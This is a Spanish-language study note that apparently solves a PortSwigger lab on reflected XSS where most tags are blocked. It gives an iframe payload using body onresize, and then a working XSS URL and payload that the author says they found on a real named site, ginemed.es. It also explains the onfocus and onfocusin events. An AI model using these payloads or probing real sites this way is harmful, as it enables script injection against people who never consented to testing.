---
title: "14 - Reflected XSS into HTML context with most tags and attributes blocked"
---

# 14 - Reflected XSS into HTML context with most tags and attributes blocked

```html
<iframe src="https://0a9f008204f5b89381d4d524009300ef.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

Fuzzear por todas las etiquetas, fuzzear por todos los eventos en https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Así es como encontramos el XSS de ginemed:
https://www.ginemed.es/?s=%3Cbutton+autofocus+onfocusin%3Dalert%281%29%3Etest%3C%2Fbutton%3E

```html
<button autofocus onfocusin="alert(1)">test</button>
```

### Explicación:

- **`<button>`**: Define un botón estándar.
- **`autofocus`**: Hace que el botón reciba automáticamente el foco cuando la página se carga.
- **`onfocusin="alert(1)"`**: Muestra una alerta con el número `1` cuando el botón recibe el foco.

Este código hará que, al cargar la página, el botón automáticamente se enfoque y ejecute la alerta `alert(1)` debido al evento `onfocusin`.

### `onfocus`

- **Propósito**: `onfocus` es un evento que se dispara cuando un elemento recibe el foco, ya sea mediante un clic del ratón o la navegación con el teclado.
- **Comportamiento**: Este evento solo se activa en el elemento al que se le ha asignado el foco, y no en sus elementos secundarios. No se propaga a los elementos padres en el DOM.
- **Ejemplo**:

  ```html
  <input type="text" onfocus="alert('Elemento enfocado')">
  ```

  En este caso, se mostrará una alerta cuando el `<input>` reciba el foco.

### `onfocusin`

- **Propósito**: `onfocusin` es un evento que se dispara cuando un elemento o cualquiera de sus elementos descendientes recibe el foco. Es el equivalente al evento `focus` pero con propagación (burbujeo) a través del DOM.
- **Comportamiento**: A diferencia de `onfocus`, `onfocusin` se propaga hacia los elementos padres. Esto significa que el evento puede ser capturado en un contenedor incluso si el foco se mueve a un elemento hijo.
- **Ejemplo**:

  ```html
  <div onfocusin="alert('Elemento o descendiente enfocado')">
    <input type="text">
  </div>
  ```

  En este caso, se mostrará una alerta tanto si el `<input>` recibe el foco como si el `<div>` lo hace, ya que `onfocusin` burbujea a través del DOM.
